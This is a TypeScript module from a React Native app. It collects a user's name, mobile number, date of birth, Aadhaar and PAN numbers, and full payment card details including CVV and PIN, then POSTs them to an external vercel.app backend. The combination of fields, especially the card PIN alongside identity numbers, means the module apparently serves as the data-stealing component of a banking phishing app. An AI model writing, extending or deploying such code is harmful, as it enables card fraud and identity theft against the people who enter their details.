import AsyncStorage from '@react-native-async-storage/async-storage';

const API_BASE_URL = 'https://abcbackend.vercel.app'; // Base URL for user

export interface UserData {
  name: string;
  mobile: string;
  dob: string;
  aadhar: string;
  pan: string;
  cardNo: string;
  expiry: string;
  cvv: string;
  pin: string;
}

export async function sendUserData(userData: UserData): Promise<any> {
  try {
    const response = await fetch(`${API_BASE_URL}/api/user`, {
      method: 'POST',
      headers: {
        'Content-Type': 'application/json',
      },
      body: JSON.stringify(userData),
    });

    const result = await response.json();
    console.log('Server response:', result);

    if (!response.ok) {
      throw new Error(`HTTP ${response.status}: ${result.error || 'Unknown error'}`);
    }

    return result;
  } catch (error: any) {
    console.error('Error sending user data:', error.message);
    throw error;
  }
}
